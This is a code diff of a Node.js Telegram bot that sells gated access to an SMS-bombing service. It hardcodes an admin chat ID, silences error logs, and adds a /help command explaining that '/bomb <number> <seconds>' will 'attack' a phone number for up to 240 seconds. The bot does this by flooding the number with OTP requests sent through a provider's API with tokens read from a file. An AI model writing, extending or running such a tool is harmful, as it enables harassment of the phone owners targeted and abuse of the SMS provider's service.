@@ -10,12 +10,10 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// ENV variables
 const botToken = process.env.BOT_TOKEN;
 const mongoUri = process.env.MONGO_URI;
-const adminChatIds = process.env.ADMIN_CHAT_IDS.split(',');
-
 const bot = new TelegramBot(botToken, { polling: true });
+
 const file = JSON.parse(fs.readFileSync("eytokens.json", "utf-8"));
 
 const headers = {
@@ -32,6 +30,7 @@ const numberspamed = {};
 const client = new MongoClient(mongoUri, { useNewUrlParser: true, useUnifiedTopology: true });
 const dbName = 'SMSBOTUSERS';
 const usersCollection = 'DBUSERS';
+const ADMIN_CHAT_ID = 7810011711;
 
 async function connectDB() {
   await client.connect();
@@ -45,9 +44,7 @@ async function smsotp(phone) {
       phone,
       areaCode: "63"
     }, { headers: { ...headers, cookie } });
-  } catch (error) {
-    console.error("SMS OTP error:", error.message || error);
-  }
+  } catch (error) {}
 }
 
 async function approveUser(userId, expirationDate) {
@@ -73,7 +70,6 @@ async function checkExpiredUsers() {
 }
 setInterval(checkExpiredUsers, 60 * 1000);
 
-// --- Telegram Commands ---
 bot.onText(/\/start/, async msg => {
   const userId = msg.from.id;
   const username = msg.from.username || "NoUsername";
@@ -98,19 +94,33 @@ bot.onText(/\/request/, async msg => {
     caption: "📨 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗦𝗘𝗡𝗗𝗘𝗗 𝗧𝗢 𝗧𝗛𝗘 𝗔𝗗𝗠𝗜𝗡, 𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗧𝗛𝗘 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟"
   });
 
-  for (const adminId of adminChatIds) {
-    await bot.sendMessage(adminId, `📥 *𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗖𝗖𝗘𝗦𝗦*\n\n👤 @${username}\n🆔 ID: ${userId}`, {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: "✅ Approve", callback_data: `approve_${userId}` },
-            { text: "❌ Decline", callback_data: `decline_${userId}` }
-          ]
+  await bot.sendMessage(ADMIN_CHAT_ID, `📥 *𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗖𝗖𝗘𝗦𝗦*\n\n👤 @${username}\n🆔 ID: ${userId}`, {
+    parse_mode: 'Markdown',
+    reply_markup: {
+      inline_keyboard: [
+        [
+          { text: "✅ Approve", callback_data: `approve_${userId}` },
+          { text: "❌ Decline", callback_data: `decline_${userId}` }
         ]
-      }
-    });
-  }
+      ]
+    }
+  });
+});
+
+bot.onText(/\/help/, async msg => {
+  const userId = msg.from.id;
+
+  const helpText = `📖 *𝗛𝗢𝗪 𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗘 𝗕𝗢𝗧*\n\n` +
+    `🔹 /start – Welcome message and intro\n` +
+    `🔹 /request – Ask for access (approval needed)\n` +
+    `🔹 /bomb <number> <seconds> – Start SMS bombing\n\n` +
+    `📌 *𝗘𝗫𝗔𝗠𝗣𝗟𝗘:* \`/bomb 09123456789 60\`\n` +
+    `This will attack 09123456789 for 60 seconds\n\n` +
+    `⚠️ Max duration: 240s\n` +
+    `⚠️ Only one bomb per number at a time\n\n` +
+    `If your access expires, just use /request again to reapply.`;
+
+  await bot.sendMessage(userId, helpText, { parse_mode: 'Markdown' });
 });
 
 bot.on('callback_query', async query => {
@@ -191,9 +201,7 @@ app.post('/api/delete-access', async (req, res) => {
 
   try {
     await bot.sendMessage(parseInt(user_id), "🚫 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗥𝗘𝗩𝗢𝗞𝗘𝗗 𝗕𝗬 𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥.");
-  } catch (e) {
-    console.log("Failed to notify user");
-  }
+  } catch (e) {}
 
   return res.json({ success: true });
 });
